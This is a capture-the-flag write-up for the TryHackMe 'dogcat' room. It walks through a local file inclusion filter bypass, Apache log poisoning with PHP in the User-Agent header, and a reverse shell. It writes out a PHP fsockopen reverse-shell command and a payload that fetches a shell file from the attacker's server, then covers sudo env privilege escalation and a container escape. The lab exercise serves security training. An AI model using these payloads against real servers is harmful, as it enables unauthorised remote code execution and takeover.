# Dog Cat VM
[Play here](https://tryhackme.com/room/dogcat)

## Recon

Exploring the website, we see that images come in the form of: 
`http://10.10.13.155/cats/7.jpg`

```
❯ nmap -script=default -sV -A 10.10.13.155
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 23:30 EST
Nmap scan report for 10.10.13.155
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.90 seconds
```


We can access this :( `http://10.10.13.155/cats/`

Gobuster shows `/cat.php` and `/dog.php`; which shows random images of cats and dogs respectively. Okay. Wow what? There seems no other option than messing around with `php` stuff. 

The room already gives us the hint of having LFI. Looking at [OWASP LFI](php://filter/convert.base64-encode/resource=FILE) we get this `http://vulnerable_host/preview.php?file=../../../../etc/passwd%00` giving us the exact path to the etc file, and we have a filter `php://filter/convert.base64-encode/resource=FILE`. As they metion in `OWASP LFI`, 

> However, in some specific implementations this vulnerability can be used to upgrade the attack from LFI to Remote Code Execution vulnerabilities that could potentially fully compromise the host.

> This enhancement is common when an attacker could be able to combine the LFI vulnerability with certain PHP wrappers.

Sounds interesting. When we go to `http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=dog` we see `<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />`. Exactly as we expected.

However, going to `http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd` shows us

![](https://i.imgur.com/6RCCMBr.png)

Note how it wants us to only look at cats or dogs. I put in `http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=./dog/../../../../etc/passwd` to sneak, and it gives:

![](https://i.imgur.com/rTB0ycb.png)

So now using that null byte, we get:

![](https://i.imgur.com/U4LAy7k.png)

Nothing yet. So it'd now help to have a look at the index file itself.

```
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

This makes a lot of sense. We can see it always wants dog or cat included. It also has this parameter `ext`, which we can set or unset. This means the url must look like:

```
http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=dog../../../../../../etc/passwd&ext=
```

This gives us the contents of the `/etc/passwd` file!

Looking at the contents, we do not find anything out of the blue. What to do next? Well time for a reverse shell. The question is, how do we setup one?


The answer is using `Apache Log Poisoning`.

`http://10.10.152.133/?view=dog/../../../../../var/log/apache2/access.log&ext=`


The below is what we find in the logs
```
127.0.0.1 - - [04/Mar/2021:02:58:39 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:02:59:15 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:02:59:57 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:00:36 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:01:16 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:01:56 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 10.8.150.214 - - [04/Mar/2021:03:02:00 +0000] "GET / HTTP/1.1" 200 537 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" 10.8.150.214 - - [04/Mar/2021:03:02:00 +0000] "GET /style.css HTTP/1.1" 200 698 "http://10.10.124.216/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" 10.8.150.214 - - [04/Mar/2021:03:02:01 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" 10.8.150.214 - - [04/Mar/2021:03:02:14 +0000] "GET /?view=dog/../../../../../var/log/apache2/access.log&ext= HTTP/1.1" 200 775 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" 127.0.0.1 - - [04/Mar/2021:03:02:32 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:03:08 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:03:43 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:04:19 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:04:55 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:05:26 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"  
```

The below is what kind of user-requests looks like (I opened up burpsuite)
```
GET /?view=dog/../../../../../var/log/apache2/access.log&ext= HTTP/1.1
Host: 10.10.124.216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

Lets put the ability to put commands as: `<?php system((isset($_GET['c']))?$_GET['c']:'echo'); ?>:

Thus, using it as: 
```
GET /?view=dog&c=php%20-r%20'$sock=fsockopen(%2210.8.150.214%22,4444);exec(%22/bin/sh%20-i%20%3C&3%20%3E&3%202%3E&3%22); HTTP/1.1
Host: 10.10.124.216
User-Agent: %3C?php%20system((isset($_GET%5B'c'%5D))?$_GET%5B'c'%5D:'echo');%20?%3E%0A
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

It does not work. So, I am going to try another route: upload the reverse shell php file (already present in kali systems) to the server using `curl` and the `-A` flag for setting the user agent. But thats not all, we need to have the file served, so that the curl command curls from our temporary server. I am going to use python3 simple http server for this.

```
❯ sudo python3 -m http.server 4242
Serving HTTP on 0.0.0.0 port 4242 (http://0.0.0.0:4242/) ...
```

The curl did not work for some reason, so I fired up burp again, and this is what I put:
```
GET /?view=dog../../../../../var/log/apache2/access.log&ext= HTTP/1.1
Host: 10.10.8.231
User-Agent: <?php file_put_contents('phpreverseshell.php',file_get_contents('http://10.8.150.214:4242/phpreverseshell.php'))?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

I see get requests, so the payload was successful!

```
❯ sudo python3 -m http.server 4242
Serving HTTP on 0.0.0.0 port 4242 (http://0.0.0.0:4242/) ...
10.10.8.231 - - [03/Mar/2021 23:55:53] "GET /phpreverseshell.php HTTP/1.0" 200 -
10.10.8.231 - - [03/Mar/2021 23:56:21] "GET /phpreverseshell.php HTTP/1.0" 200 -
``` 

Now, lets go to: `http://10.10.8.231/phpreverseshell.php`. And don't forget to setup `nc` as well :P

## Foothold
```
$ pwd
/
$ whoami
www-data
```
We are in!

```
$ cat flag2_QMW7JvaY2LvK.txt
THM{leet}
$ pwd
/var/www
```


```
$ cat flag.php
<?php
$flag_1 = "THM{l33t}"
?>
$ pwd
/var/www/html
```

Looking at the sudo permissions, we have:
```
$ sudo -l
Matching Defaults entries for www-data on f7c1f89308d0:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on f7c1f89308d0:
    (root) NOPASSWD: /usr/bin/env
```

Interestingly, the machine name looks like a docker container. As for the permissions, `gtfobins` ftw. Anyways, after successful priv esc, we can get the third flag. 

Looking around, we see an interesting file in `/opt/backup`, which looks like our way out.
```
# cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

Let's setup `nc` for a second time now, at another port
```
❯ nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.8.231] 40614
bash: cannot set terminal process group (3450): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
cat flag4.txt                                                   
THM{PWNED} 
```

And we are done!
